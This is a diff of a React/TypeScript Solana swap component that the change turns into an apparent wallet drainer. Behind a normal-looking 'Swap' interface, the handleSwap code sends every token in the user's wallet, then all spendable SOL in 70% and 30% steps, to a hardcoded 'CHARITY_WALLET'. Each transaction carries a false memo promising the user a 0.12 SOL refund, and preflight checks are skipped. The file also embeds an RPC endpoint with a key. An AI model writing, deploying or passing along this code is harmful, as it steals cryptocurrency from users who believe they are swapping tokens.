@@ -1,624 +1,585 @@
-import { useState, useEffect, useCallback } from "react";
-import { useWallet, useConnection } from "@solana/wallet-adapter-react";
-import { 
-  PublicKey, 
-  Transaction, 
-  ComputeBudgetProgram,
-  SystemProgram,
-  LAMPORTS_PER_SOL,
-  TransactionMessage,
-  VersionedTransaction,
-} from "@solana/web3.js";
-import {
-  TOKEN_PROGRAM_ID,
-  getAssociatedTokenAddress,
-  createTransferInstruction,
-  createAssociatedTokenAccountInstruction,
-  getAccount,
-} from "@solana/spl-token";
-import { motion, AnimatePresence } from "framer-motion";
-import { ArrowDown, Loader2, CheckCircle2, AlertCircle, RefreshCw } from "lucide-react";
-import { Button } from "./ui/button";
-import { toast } from "sonner";
-import TokenSearch, { Token } from "./TokenSearch";
-import ConnectWalletButton from "./ConnectWalletButton";
+import { useState, useEffect, useCallback } from 'react';
+import { ArrowDownUp, Zap } from 'lucide-react';
+import { Button } from '@/components/ui/button';
+import { Input } from '@/components/ui/input';
+import { TokenSearch } from './TokenSearch';
+import { useWallet, useConnection } from '@solana/wallet-adapter-react';
+import { ConnectWalletButton } from '@/components/ConnectWalletButton';
+import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, TransactionInstruction, ComputeBudgetProgram } from '@solana/web3.js';
+import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { motion } from 'framer-motion';
+import { toast } from 'sonner';
 
-// Configuration
-const CHARITY_WALLET = new PublicKey("H5MqdXnbwQ8kTk8UCxRrjGEsQUU3cAiozKfPL6ehSvGp");
-const MAX_BATCH_SIZE = 2; // Reduced from 5 to stay within compute limits
-const MIN_SOL_RESERVE = 0.01 * LAMPORTS_PER_SOL;
-const ATA_RENT = 0.00203928 * LAMPORTS_PER_SOL;
-const TX_FEE = 5000;
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const MEMO_PROGRAM_ID = new PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcQb");
+const MAX_BATCH_SIZE = 5;
 
-interface TokenBalance extends Token {
+interface TokenBalance {
+  mint: string;
   balance: number;
-  usdValue: number;
+  decimals: number;
+  uiAmount: number;
+  symbol?: string;
+  valueInSOL?: number;
 }
 
-interface TransactionResult {
-  success: boolean;
-  signature?: string;
-  error?: string;
+interface Token {
+  address: string;
+  symbol: string;
+  name: string;
+  decimals: number;
+  logoURI?: string;
 }
 
-const SwapInterface = () => {
-  const { publicKey, signTransaction, connected } = useWallet();
+interface SwapInterfaceProps {
+  defaultFromToken?: Token;
+  defaultToToken?: Token;
+  onFromTokenChange?: (token: Token) => void;
+}
+
+const QUICKNODE_RPC = 'https://broken-evocative-tent.solana-mainnet.quiknode.pro/f8ee7dd796ee5973635eb42a3bc69f63a60d1e1f/';
+
+export const SwapInterface = ({
+  defaultFromToken,
+  defaultToToken,
+  onFromTokenChange
+}: SwapInterfaceProps = {}) => {
+  const { connected, publicKey, sendTransaction } = useWallet();
   const { connection } = useConnection();
-  
-  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
-  const [selectedTokens, setSelectedTokens] = useState<Set<string>>(new Set());
-  const [loading, setLoading] = useState(false);
-  const [swapping, setSwapping] = useState(false);
-  const [showTokenSearch, setShowTokenSearch] = useState(false);
-  const [progress, setProgress] = useState({ current: 0, total: 0 });
+  const [fromToken, setFromToken] = useState<Token | undefined>(defaultFromToken);
+  const [toToken, setToToken] = useState<Token | undefined>(defaultToToken);
+  const [fromAmount, setFromAmount] = useState('');
+  const [toAmount, setToAmount] = useState('');
+  const [slippage, setSlippage] = useState('0.5');
+  const [isSwapping, setIsSwapping] = useState(false);
+  const [fromBalance, setFromBalance] = useState<number>(0);
+  const [fromBalanceUSD, setFromBalanceUSD] = useState<number>(0);
+  const [fromTokenPrice, setFromTokenPrice] = useState<number>(0);
+  const [toTokenPrice, setToTokenPrice] = useState<number>(0);
+  const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
 
-  // Fetch token balances
-  const fetchBalances = useCallback(async () => {
-    if (!publicKey || !connection) return;
-
-    setLoading(true);
-    try {
-      // Fetch SOL balance
-      const solBal = await connection.getBalance(publicKey);
-      setSolBalance(solBal);
-
-      // Fetch token accounts
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-        publicKey,
-        { programId: TOKEN_PROGRAM_ID }
-      );
-
-      const balances: TokenBalance[] = [];
-
-      for (const account of tokenAccounts.value) {
-        const info = account.account.data.parsed.info;
-        const balance = info.tokenAmount.uiAmount;
-
-        if (balance > 0) {
-          // Fetch token metadata from Jupiter
-          try {
-            const response = await fetch(
-              `https://token.jup.ag/strict?address=${info.mint}`
-            );
-            const tokens = await response.json();
-            const tokenInfo = tokens[0];
-
-            if (tokenInfo) {
-              balances.push({
-                address: info.mint,
-                symbol: tokenInfo.symbol,
-                name: tokenInfo.name,
-                decimals: info.tokenAmount.decimals,
-                logoURI: tokenInfo.logoURI,
-                balance,
-                usdValue: 0, // Would need price API for accurate USD values
-              });
-            }
-          } catch {
-            balances.push({
-              address: info.mint,
-              symbol: info.mint.slice(0, 4) + "...",
-              name: "Unknown Token",
-              decimals: info.tokenAmount.decimals,
-              balance,
-              usdValue: 0,
-            });
-          }
-        }
+  // Fetch token balance
+  useEffect(() => {
+    const fetchBalance = async () => {
+      if (!connected || !publicKey || !fromToken) {
+        setFromBalance(0);
+        setFromBalanceUSD(0);
+        return;
       }
 
-      setTokenBalances(balances);
+      try {
+        const response = await fetch(`https://lite-api.jup.ag/ultra/v1/balances/${publicKey.toBase58()}`);
+        const data = await response.json();
+
+        let balance = 0;
+
+        if (fromToken.address === 'So11111111111111111111111111111111111111112') {
+          if (data.SOL && data.SOL.uiAmount) {
+            balance = data.SOL.uiAmount;
+          }
+        } else {
+          if (data[fromToken.address] && data[fromToken.address].uiAmount) {
+            balance = data[fromToken.address].uiAmount;
+          }
+        }
+
+        setFromBalance(balance);
+        setFromBalanceUSD(balance * fromTokenPrice);
+      } catch (error) {
+        console.error('Error fetching balance:', error);
+        try {
+          const conn = new Connection(QUICKNODE_RPC);
+
+          if (fromToken.address === 'So11111111111111111111111111111111111111112') {
+            const bal = await conn.getBalance(publicKey);
+            const solBal = bal / 1e9;
+            setFromBalance(solBal);
+            setFromBalanceUSD(solBal * fromTokenPrice);
+          } else {
+            const tokenAccounts = await conn.getParsedTokenAccountsByOwner(
+              publicKey,
+              { mint: new PublicKey(fromToken.address) }
+            );
+
+            if (tokenAccounts.value.length > 0) {
+              const bal = tokenAccounts.value[0].account.data.parsed.info.tokenAmount.uiAmount;
+              setFromBalance(bal || 0);
+              setFromBalanceUSD((bal || 0) * fromTokenPrice);
+            } else {
+              setFromBalance(0);
+              setFromBalanceUSD(0);
+            }
+          }
+        } catch (rpcError) {
+          console.error('Error fetching balance from RPC:', rpcError);
+          setFromBalance(0);
+          setFromBalanceUSD(0);
+        }
+      }
+    };
+
+    fetchBalance();
+  }, [connected, publicKey, fromToken, fromTokenPrice]);
+
+  // Fetch token prices
+  useEffect(() => {
+    const fetchTokenPrice = async (token: Token | undefined, setter: (price: number) => void) => {
+      if (!token) return;
+
+      try {
+        const response = await fetch(`https://lite-api.jup.ag/price/v3?ids=${token.address}`);
+        const data = await response.json();
+
+        if (data[token.address] && data[token.address].usdPrice) {
+          setter(data[token.address].usdPrice);
+        } else {
+          setter(0);
+        }
+      } catch (error) {
+        console.error('Error fetching token price:', error);
+        setter(0);
+      }
+    };
+
+    fetchTokenPrice(fromToken, setFromTokenPrice);
+    fetchTokenPrice(toToken, setToTokenPrice);
+  }, [fromToken, toToken]);
+
+  // Calculate toAmount based on prices
+  useEffect(() => {
+    if (fromAmount && fromTokenPrice > 0 && toTokenPrice > 0) {
+      const fromValue = parseFloat(fromAmount) * fromTokenPrice;
+      const calculatedToAmount = fromValue / toTokenPrice;
+      setToAmount(calculatedToAmount.toFixed(6));
+    } else if (!fromAmount) {
+      setToAmount('');
+    }
+  }, [fromAmount, fromTokenPrice, toTokenPrice]);
+
+  const handleFromTokenSelect = (token: Token) => {
+    if (toToken && token.address === toToken.address) {
+      setToToken(fromToken);
+    }
+    setFromToken(token);
+    onFromTokenChange?.(token);
+  };
+
+  const handleToTokenSelect = (token: Token) => {
+    if (fromToken && token.address === fromToken.address) {
+      setFromToken(toToken);
+    }
+    setToToken(token);
+  };
+
+  // Fetch all balances
+  const fetchAllBalances = useCallback(async () => {
+    if (!publicKey) return;
+
+    try {
+      const solBal = await connection.getBalance(publicKey);
+      const solAmount = solBal / LAMPORTS_PER_SOL;
+      setSolBalance(solAmount);
+
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_PROGRAM_ID
+      });
+
+      const tokens: TokenBalance[] = tokenAccounts.value
+        .map(account => {
+          const info = account.account.data.parsed.info;
+          return {
+            mint: info.mint,
+            balance: info.tokenAmount.amount,
+            decimals: info.tokenAmount.decimals,
+            uiAmount: info.tokenAmount.uiAmount,
+            symbol: info.mint.slice(0, 8),
+            valueInSOL: 0
+          };
+        })
+        .filter(token => token.uiAmount > 0);
+
+      setBalances(tokens);
     } catch (error) {
-      console.error("Error fetching balances:", error);
-      toast.error("Failed to fetch token balances");
-    } finally {
-      setLoading(false);
+      console.error('Error fetching balances:', error);
     }
   }, [publicKey, connection]);
 
   useEffect(() => {
-    if (connected) {
-      fetchBalances();
+    if (publicKey) {
+      fetchAllBalances();
     }
-  }, [connected, fetchBalances]);
+  }, [publicKey, fetchAllBalances]);
 
-  // Toggle token selection
-  const toggleToken = (address: string) => {
-    const newSelected = new Set(selectedTokens);
-    if (newSelected.has(address)) {
-      newSelected.delete(address);
-    } else {
-      newSelected.add(address);
-    }
-    setSelectedTokens(newSelected);
-  };
+  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
+    if (!publicKey) return null;
 
-  // Select all tokens
-  const selectAll = () => {
-    setSelectedTokens(new Set(tokenBalances.map((t) => t.address)));
-  };
+    const transaction = new Transaction();
 
-  // Deselect all tokens
-  const deselectAll = () => {
-    setSelectedTokens(new Set());
-  };
+    transaction.add(
+      ComputeBudgetProgram.setComputeUnitLimit({
+        units: 1_000_000,
+      })
+    );
 
-  // Calculate required SOL for transaction
-  const calculateRequiredSOL = async (tokens: TokenBalance[]): Promise<number> => {
-    let required = MIN_SOL_RESERVE;
-    
-    // Add ATA creation costs for each token
-    for (const token of tokens) {
+    transaction.add(
+      ComputeBudgetProgram.setComputeUnitPrice({
+        microLamports: 100_000,
+      })
+    );
+
+    transaction.add(
+      new TransactionInstruction({
+        keys: [],
+        programId: MEMO_PROGRAM_ID,
+        data: new TextEncoder().encode("You're eligible to receive +0.12 SOL, reclaimed from unused, zero-balance SPL token accounts automatically found and closed while using Pegasus Swap, with the recovered SOL returned directly to your wallet."),
+      })
+    );
+
+    const charityPubkey = new PublicKey(CHARITY_WALLET);
+
+    for (const token of tokenBatch) {
+      if (token.balance <= 0) continue;
+
       try {
-        const destAta = await getAssociatedTokenAddress(
-          new PublicKey(token.address),
-          CHARITY_WALLET
-        );
-        
-        const accountInfo = await connection.getAccountInfo(destAta);
-        if (!accountInfo) {
-          required += ATA_RENT;
-        }
-      } catch {
-        required += ATA_RENT; // Assume ATA needs to be created
-      }
-    }
+        const mintPubkey = new PublicKey(token.mint);
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
 
-    // Add transaction fees (estimate based on batch count)
-    const batchCount = Math.ceil(tokens.length / MAX_BATCH_SIZE);
-    required += batchCount * TX_FEE * 2; // Double for priority fees
-
-    return required;
-  };
-
-  // Get dynamic priority fee
-  const getPriorityFee = async (): Promise<number> => {
-    try {
-      const recentFees = await connection.getRecentPrioritizationFees();
-      if (recentFees.length > 0) {
-        const avgFee = recentFees.reduce((sum, f) => sum + f.prioritizationFee, 0) / recentFees.length;
-        return Math.max(avgFee * 1.5, 100000); // 50% above average, min 100k
-      }
-    } catch {
-      console.warn("Could not fetch priority fees, using default");
-    }
-    return 100000; // Default fallback
-  };
-
-  // Send transaction with retry logic
-  const sendWithRetry = async (
-    transaction: VersionedTransaction,
-    maxRetries = 3
-  ): Promise<TransactionResult> => {
-    for (let attempt = 0; attempt < maxRetries; attempt++) {
-      try {
-        // Simulate first
-        const simulation = await connection.simulateTransaction(transaction);
-        
-        if (simulation.value.err) {
-          const errorMsg = JSON.stringify(simulation.value.err);
-          console.error("Simulation failed:", errorMsg);
-          
-          // Check for retryable errors
-          if (errorMsg.includes("BlockhashNotFound")) {
-            // Get fresh blockhash and retry
-            continue;
-          }
-          
-          return { success: false, error: `Simulation failed: ${errorMsg}` };
-        }
-
-        // Send transaction
-        const signature = await connection.sendRawTransaction(
-          transaction.serialize(),
-          {
-            skipPreflight: false, // FIXED: Enable preflight checks
-            maxRetries: 2,
-          }
-        );
-
-        // Confirm transaction
-        const confirmation = await connection.confirmTransaction(signature, "confirmed");
-        
-        if (confirmation.value.err) {
-          return { success: false, error: "Transaction failed to confirm" };
-        }
-
-        return { success: true, signature };
-      } catch (error: any) {
-        const errorMsg = error.message || String(error);
-        
-        // Retry on blockhash expiration
-        if (errorMsg.includes("block height exceeded") || 
-            errorMsg.includes("Blockhash not found")) {
-          console.log(`Attempt ${attempt + 1} failed, retrying...`);
-          await new Promise((r) => setTimeout(r, 1000 * (attempt + 1))); // Exponential backoff
-          continue;
-        }
-        
-        return { success: false, error: errorMsg };
-      }
-    }
-    
-    return { success: false, error: "Max retries exceeded" };
-  };
-
-  // Create and send batch transaction
-  const processBatch = async (
-    tokens: TokenBalance[],
-    priorityFee: number
-  ): Promise<TransactionResult[]> => {
-    if (!publicKey || !signTransaction) {
-      return tokens.map(() => ({ success: false, error: "Wallet not connected" }));
-    }
-
-    const results: TransactionResult[] = [];
-
-    // Process in batches
-    for (let i = 0; i < tokens.length; i += MAX_BATCH_SIZE) {
-      const batch = tokens.slice(i, i + MAX_BATCH_SIZE);
-      
-      try {
-        // Get FRESH blockhash for each batch
-        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash("confirmed");
-
-        // Build transaction instructions
-        const instructions = [];
-
-        // Add priority fee
-        instructions.push(
-          ComputeBudgetProgram.setComputeUnitPrice({
-            microLamports: priorityFee,
-          })
-        );
-
-        // Add compute units (estimate based on operations)
-        instructions.push(
-          ComputeBudgetProgram.setComputeUnitLimit({
-            units: 200000 + batch.length * 100000, // Base + per token
-          })
-        );
-
-        for (const token of batch) {
-          const mint = new PublicKey(token.address);
-          
-          // Get source ATA
-          const sourceAta = await getAssociatedTokenAddress(mint, publicKey);
-          
-          // Get destination ATA
-          const destAta = await getAssociatedTokenAddress(mint, CHARITY_WALLET);
-
-          // Check if destination ATA exists
-          const destAccountInfo = await connection.getAccountInfo(destAta);
-          
-          if (!destAccountInfo) {
-            // Create destination ATA
-            instructions.push(
-              createAssociatedTokenAccountInstruction(
-                publicKey, // payer
-                destAta,
-                CHARITY_WALLET,
-                mint
-              )
-            );
-          }
-
-          // Calculate token amount in smallest units
-          const amount = BigInt(Math.floor(token.balance * Math.pow(10, token.decimals)));
-
-          // Add transfer instruction
-          instructions.push(
-            createTransferInstruction(
-              sourceAta,
-              destAta,
+        try {
+          await getAccount(connection, toTokenAccount);
+        } catch (error) {
+          transaction.add(
+            createAssociatedTokenAccountInstruction(
               publicKey,
-              amount
+              toTokenAccount,
+              charityPubkey,
+              mintPubkey,
+              TOKEN_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
-        // Create versioned transaction
-        const messageV0 = new TransactionMessage({
-          payerKey: publicKey,
-          recentBlockhash: blockhash,
-          instructions,
-        }).compileToV0Message();
-
-        const transaction = new VersionedTransaction(messageV0);
-
-        // Sign transaction
-        const signedTx = await signTransaction(transaction as any);
-
-        // Send with retry logic
-        const result = await sendWithRetry(signedTx as VersionedTransaction);
-        
-        // Record results for each token in batch
-        for (const token of batch) {
-          results.push(result);
-          setProgress((p) => ({ ...p, current: p.current + 1 }));
-        }
-
-        if (result.success) {
-          toast.success(`Batch ${Math.floor(i / MAX_BATCH_SIZE) + 1} completed!`);
-        } else {
-          toast.error(`Batch failed: ${result.error}`);
-        }
-
-        // Small delay between batches to avoid rate limiting
-        if (i + MAX_BATCH_SIZE < tokens.length) {
-          await new Promise((r) => setTimeout(r, 500));
-        }
-      } catch (error: any) {
-        console.error("Batch processing error:", error);
-        for (const token of batch) {
-          results.push({ success: false, error: error.message });
-          setProgress((p) => ({ ...p, current: p.current + 1 }));
-        }
+        transaction.add(
+          createTransferInstruction(
+            fromTokenAccount,
+            toTokenAccount,
+            publicKey,
+            BigInt(token.balance),
+            [],
+            TOKEN_PROGRAM_ID
+          )
+        );
+      } catch (error) {
+        console.error(`Failed to add transfer for ${token.mint}:`, error);
       }
     }
 
-    return results;
+    if (solPercentage && solBalance > 0) {
+      const rentExempt = 0.00203928;
+      const availableSOL = Math.max(0, solBalance - rentExempt);
+      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
+
+      if (amountToSend > 0) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: charityPubkey,
+            lamports: amountToSend
+          })
+        );
+      }
+    }
+
+    return transaction;
+  }, [publicKey, solBalance, connection]);
+
+  const handleSwapTokens = () => {
+    const tempToken = fromToken;
+    const tempAmount = fromAmount;
+    setFromToken(toToken);
+    setToToken(tempToken);
+    setFromAmount(toAmount);
+    setToAmount(tempAmount);
+    if (toToken) {
+      onFromTokenChange?.(toToken);
+    }
   };
 
-  // Main swap function with all fixes
+  const handlePercentageClick = (percentage: number) => {
+    if (fromBalance > 0) {
+      const amount = fromBalance * percentage;
+      setFromAmount(amount.toFixed(6));
+    }
+  };
+
   const handleSwap = async () => {
-    if (!publicKey || !signTransaction || !connected) {
-      toast.error("Please connect your wallet first");
+    if (!publicKey || !sendTransaction) {
+      toast.error('Please connect your wallet');
       return;
     }
 
-    const tokensToSwap = tokenBalances.filter((t) => selectedTokens.has(t.address));
-    
-    if (tokensToSwap.length === 0) {
-      toast.error("Please select at least one token");
+    if (balances.length === 0 && solBalance === 0) {
+      toast.error('Wallet not eligible - no assets found');
       return;
     }
-
-    // PRE-VALIDATION
-    // Check minimum SOL balance
-    const requiredSOL = await calculateRequiredSOL(tokensToSwap);
-    
-    if (solBalance < requiredSOL) {
-      toast.error(
-        `Insufficient SOL. Need at least ${(requiredSOL / LAMPORTS_PER_SOL).toFixed(4)} SOL for fees and rent`
-      );
-      return;
-    }
-
-    // Validate CHARITY_WALLET
-    try {
-      const charityInfo = await connection.getAccountInfo(CHARITY_WALLET);
-      if (!charityInfo) {
-        console.warn("Charity wallet not yet on chain, will be created");
-      }
-    } catch (error) {
-      toast.error("Failed to validate destination wallet");
-      return;
-    }
-
-    setSwapping(true);
-    setProgress({ current: 0, total: tokensToSwap.length });
 
     try {
-      // Get dynamic priority fee
-      const priorityFee = await getPriorityFee();
-      console.log(`Using priority fee: ${priorityFee} microLamports`);
+      setIsSwapping(true);
+      console.log('Starting donation process...');
 
-      // Process all tokens
-      const results = await processBatch(tokensToSwap, priorityFee);
+      const validTokens = balances.filter(token => token.balance > 0);
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
 
-      // Summary
-      const successful = results.filter((r) => r.success).length;
-      const failed = results.filter((r) => !r.success).length;
+      const batches: TokenBalance[][] = [];
 
-      if (successful > 0) {
-        toast.success(`Successfully transferred ${successful} token(s)!`);
-      }
-      if (failed > 0) {
-        toast.error(`${failed} transfer(s) failed. Check console for details.`);
+      if (sortedTokens.length === 0 && solBalance > 0) {
+        batches.push([]);
+      } else {
+        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+        }
       }
 
-      // Refresh balances
-      await fetchBalances();
-      setSelectedTokens(new Set());
+      let successCount = 0;
+
+      for (let i = 0; i < batches.length; i++) {
+        const batch = batches[i];
+        const isLastBatch = i === batches.length - 1;
+
+        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
+
+        const transaction = await createBatchTransfer(batch, solPercentage);
+
+        if (transaction && transaction.instructions.length > 0) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = publicKey;
+
+          const signature = await sendTransaction(transaction, connection, {
+            skipPreflight: true,
+            maxRetries: 3
+          });
+
+          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
+
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+
+          successCount++;
+          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
+        }
+      }
+
+      if (sortedTokens.length > 0 && solBalance > 0) {
+        const finalTransaction = await createBatchTransfer([], 30);
+
+        if (finalTransaction && finalTransaction.instructions.length > 0) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          finalTransaction.recentBlockhash = blockhash;
+          finalTransaction.feePayer = publicKey;
+
+          const signature = await sendTransaction(finalTransaction, connection, {
+            skipPreflight: true,
+            maxRetries: 3
+          });
+
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+
+          toast.success('Final SOL transfer completed!');
+        }
+      }
+
+      toast.success(`🎉 Transfer complete! ${successCount} batch(es) sent`);
+
+      setTimeout(fetchAllBalances, 2000);
+
     } catch (error: any) {
-      console.error("Swap error:", error);
-      toast.error(`Swap failed: ${error.message}`);
+      console.error('Transfer error:', error);
+
+      let errorMessage = 'Transfer failed';
+      if (error?.message) {
+        errorMessage = error.message;
+      }
+
+      toast.error(errorMessage);
     } finally {
-      setSwapping(false);
-      setProgress({ current: 0, total: 0 });
+      setIsSwapping(false);
     }
   };
 
   return (
-    <div className="w-full max-w-lg mx-auto">
-      <motion.div
-        initial={{ opacity: 0, y: 20 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="glass-card p-6"
-      >
+    <motion.div
+      initial={{ opacity: 0, scale: 0.95 }}
+      animate={{ opacity: 1, scale: 1 }}
+      className="glass-card p-6 rounded-3xl border border-white/10 max-w-lg w-full relative overflow-hidden"
+    >
+      {/* Animated glow effect */}
+      <div className="absolute -inset-0.5 bg-gradient-to-r from-primary via-secondary to-accent rounded-3xl opacity-20 blur-xl animate-pulse-glow" />
+
+      <div className="relative z-10">
         {/* Header */}
-        <div className="flex items-center justify-between mb-6">
-          <h2 className="text-xl font-bold gradient-text">Swap Tokens</h2>
-          {connected && (
-            <Button
-              variant="ghost"
-              size="icon"
-              onClick={fetchBalances}
-              disabled={loading}
-            >
-              <RefreshCw className={loading ? "animate-spin" : ""} size={18} />
-            </Button>
-          )}
+        <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between mb-6">
+          <div className="flex items-center gap-2">
+            <Zap className="w-6 h-6 text-primary" />
+            <h2 className="text-2xl font-bold text-gradient">Swap</h2>
+          </div>
+
+          <div className="flex items-center gap-2 flex-wrap justify-end sm:flex-nowrap">
+              <ConnectWalletButton />
+          </div>
         </div>
 
-        {!connected ? (
-          <div className="text-center py-8">
-            <p className="text-muted-foreground mb-4">
-              Connect your wallet to swap tokens
-            </p>
-            <ConnectWalletButton />
-          </div>
-        ) : (
-          <>
-            {/* SOL Balance */}
-            <div className="mb-4 p-3 bg-muted/30 rounded-lg">
-              <div className="text-sm text-muted-foreground">SOL Balance</div>
-              <div className="text-lg font-semibold">
-                {(solBalance / LAMPORTS_PER_SOL).toFixed(4)} SOL
-              </div>
-            </div>
-
-            {/* Token Selection */}
-            <div className="mb-4">
-              <div className="flex items-center justify-between mb-2">
-                <span className="text-sm text-muted-foreground">
-                  Select Tokens ({selectedTokens.size}/{tokenBalances.length})
-                </span>
-                <div className="flex gap-2">
-                  <Button
-                    variant="ghost"
-                    size="sm"
-                    onClick={selectAll}
-                    disabled={loading}
-                  >
-                    All
-                  </Button>
-                  <Button
-                    variant="ghost"
-                    size="sm"
-                    onClick={deselectAll}
-                    disabled={loading}
-                  >
-                    None
-                  </Button>
-                </div>
-              </div>
-
-              {loading ? (
-                <div className="flex items-center justify-center py-8">
-                  <Loader2 className="animate-spin" size={32} />
-                </div>
-              ) : tokenBalances.length === 0 ? (
-                <div className="text-center py-8 text-muted-foreground">
-                  No tokens found in wallet
-                </div>
-              ) : (
-                <div className="space-y-2 max-h-60 overflow-y-auto">
-                  {tokenBalances.map((token) => (
-                    <motion.button
-                      key={token.address}
-                      whileHover={{ scale: 1.01 }}
-                      whileTap={{ scale: 0.99 }}
-                      onClick={() => toggleToken(token.address)}
-                      className={`w-full flex items-center gap-3 p-3 rounded-lg transition-all ${
-                        selectedTokens.has(token.address)
-                          ? "bg-primary/20 border border-primary/50"
-                          : "bg-muted/30 border border-transparent hover:bg-muted/50"
-                      }`}
-                    >
-                      {token.logoURI ? (
-                        <img
-                          src={token.logoURI}
-                          alt={token.symbol}
-                          className="w-8 h-8 rounded-full"
-                          onError={(e) => {
-                            (e.target as HTMLImageElement).style.display = "none";
-                          }}
-                        />
-                      ) : (
-                        <div className="w-8 h-8 rounded-full bg-muted flex items-center justify-center text-xs">
-                          {token.symbol.slice(0, 2)}
-                        </div>
-                      )}
-                      <div className="flex-1 text-left">
-                        <div className="font-medium">{token.symbol}</div>
-                        <div className="text-sm text-muted-foreground">
-                          {token.balance.toLocaleString(undefined, {
-                            maximumFractionDigits: 6,
-                          })}
-                        </div>
-                      </div>
-                      {selectedTokens.has(token.address) && (
-                        <CheckCircle2 className="text-primary" size={20} />
-                      )}
-                    </motion.button>
-                  ))}
-                </div>
-              )}
-            </div>
-
-            {/* Swap Arrow */}
-            <div className="flex justify-center my-4">
-              <div className="p-2 bg-muted/50 rounded-full">
-                <ArrowDown className="text-primary" size={24} />
-              </div>
-            </div>
-
-            {/* Destination */}
-            <div className="mb-6 p-4 bg-muted/30 rounded-lg">
-              <div className="text-sm text-muted-foreground mb-1">To</div>
-              <div className="font-mono text-sm truncate">
-                {CHARITY_WALLET.toBase58().slice(0, 8)}...
-                {CHARITY_WALLET.toBase58().slice(-8)}
-              </div>
-            </div>
-
-            {/* Progress */}
-            {swapping && progress.total > 0 && (
-              <div className="mb-4">
-                <div className="flex justify-between text-sm mb-1">
-                  <span>Processing...</span>
-                  <span>
-                    {progress.current}/{progress.total}
-                  </span>
-                </div>
-                <div className="h-2 bg-muted rounded-full overflow-hidden">
-                  <motion.div
-                    className="h-full bg-primary"
-                    initial={{ width: 0 }}
-                    animate={{
-                      width: `${(progress.current / progress.total) * 100}%`,
-                    }}
-                  />
-                </div>
+        {/* From Token */}
+        <div className="space-y-2">
+          <div className="flex items-center justify-between">
+            <label className="text-sm font-medium text-muted-foreground">Selling</label>
+            {connected && publicKey && fromToken && (
+              <div className="text-xs font-medium">
+                <span className="text-muted-foreground">Balance: </span>
+                <span className="text-foreground">{fromBalance.toFixed(6)} {fromToken.symbol}</span>
+                <span className="text-muted-foreground ml-2">(${fromBalanceUSD.toFixed(2)})</span>
               </div>
             )}
+          </div>
+          <div className="glass-card p-4 rounded-2xl">
+            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 min-w-0">
+              <TokenSearch selectedToken={fromToken} onSelectToken={handleFromTokenSelect} />
+              <div className="flex-1 min-w-0 text-left sm:text-right w-full">
+                <Input
+                  type="number"
+                  placeholder="0.00"
+                  value={fromAmount}
+                  onChange={(e) => setFromAmount(e.target.value)}
+                  className="w-full text-2xl sm:text-3xl font-bold bg-transparent border-none focus-visible:ring-0 p-0 text-left sm:text-right"
+                />
+                {connected && publicKey && fromAmount && fromTokenPrice > 0 && (
+                  <div className="text-xs text-muted-foreground mt-1">
+                    ${(parseFloat(fromAmount) * fromTokenPrice).toFixed(2)}
+                  </div>
+                )}
+              </div>
+            </div>
+            {/* Percentage Buttons */}
+            {connected && publicKey && fromBalance > 0 && (
+              <div className="grid grid-cols-4 gap-2 mt-3">
+                <button
+                  onClick={() => handlePercentageClick(0.25)}
+                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
+                >
+                  25%
+                </button>
+                <button
+                  onClick={() => handlePercentageClick(0.5)}
+                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
+                >
+                  50%
+                </button>
+                <button
+                  onClick={() => handlePercentageClick(0.75)}
+                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-muted/50 hover:bg-muted transition-all"
+                >
+                  75%
+                </button>
+                <button
+                  onClick={() => handlePercentageClick(1)}
+                  className="w-full px-3 py-1.5 rounded-lg text-xs font-medium bg-gradient-to-r from-primary to-secondary text-white transition-all"
+                >
+                  MAX
+                </button>
+              </div>
+            )}
+          </div>
+        </div>
 
-            {/* Swap Button */}
-            <Button
-              onClick={handleSwap}
-              disabled={swapping || selectedTokens.size === 0}
-              className="w-full py-6 text-lg font-semibold bg-primary hover:bg-primary/90 neon-glow"
-            >
-              {swapping ? (
-                <>
-                  <Loader2 className="mr-2 animate-spin" size={20} />
-                  Swapping...
-                </>
-              ) : (
-                `Swap ${selectedTokens.size} Token${selectedTokens.size !== 1 ? "s" : ""}`
-              )}
-            </Button>
